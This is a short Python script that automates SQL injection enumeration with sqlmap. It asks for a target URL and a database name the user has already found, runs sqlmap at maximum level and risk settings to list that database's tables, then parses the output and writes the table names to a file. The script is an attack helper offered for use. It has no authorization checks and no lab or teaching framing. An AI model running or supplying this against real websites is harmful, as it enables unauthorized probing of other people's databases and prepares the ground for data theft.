import subprocess
import shutil
import os
import re

def find_sqlmap():
    
    sqlmap_path = shutil.which("sqlmap")
    if sqlmap_path is None:
        raise Exception("SQLMap not found. Make sure it's installed and available in the system PATH.")
    return sqlmap_path

def sqlmap_tables(url, database_name, output_file_path):
    sqlmap_path = find_sqlmap()

    clean_database_name = database_name.replace('[*] ', '')

    command = [sqlmap_path, '-u', url, '-D', clean_database_name, '--tables', '--level', '3', '--risk', '3']

    try:
        
        result = subprocess.run(command, capture_output=True, text=True, check=True, input="")

       
        table_names_match = re.search(rf'Database: {re.escape(clean_database_name)}\s*\n\[\d+ tables\](.+?)\n\n', result.stdout, re.DOTALL)

        if table_names_match:
            table_names_section = table_names_match.group(1)
            table_names = re.findall(r'\|\s+(\w+)\s+\|', table_names_section)

            output_lines = [f"Tables for database '{clean_database_name}':"]
            for index, table_name in enumerate(sorted(table_names), start=1):
                output_lines.append(f"{index}. {table_name}")

            with open(output_file_path, 'w') as output_file:
                for line in output_lines:
                    output_file.write(line + '\n')

            for line in output_lines:
                print(line)

            print(f"Output written to '{output_file_path}'")
        else:
            print(f"No tables found for database '{clean_database_name}'.")
    except subprocess.CalledProcessError as e:
        raise Exception(f"Error running SQLMap: {e}")

if __name__ == "__main__":
    target_url = input("Enter The URL you used to find the database: ")
    database_name = input("Enter The name database you found:")
    database_name_file = "database_names.txt"
    output_file_path = "output.txt"  

    sqlmap_tables(target_url, database_name, output_file_path)
'''
    try:
        # Read the database name from the file
        with open(database_name_file, 'r') as db_file:
            database_name = db_file.readline().strip()

        Fetch tables for the specified database and store the output in a text file
        
    except Exception as e:
        print(f"Error: {e}")
'''